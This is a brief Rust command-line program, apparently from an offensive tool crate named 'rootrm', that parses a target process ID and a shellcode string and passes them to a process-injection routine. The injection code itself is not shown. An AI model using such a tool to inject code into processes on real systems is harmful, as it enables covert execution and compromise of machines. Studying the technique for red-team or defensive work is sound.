use clap::Parser;
use rootrm::migration;

#[derive(Parser, Debug)]
#[command(author, version, about, long_about = None)]
struct Args {
    #[arg(short, long)]
    process: u32,

    #[arg(short, long)]
    shell_code: String,
}

fn main() {
    let args = Args::parse();

    // Only returns errors; Succeeds with empty return
    let _result = migration::process_injection(args.process, args.shell_code.as_bytes().to_vec())
        .expect("Failed to Inject Code");
}
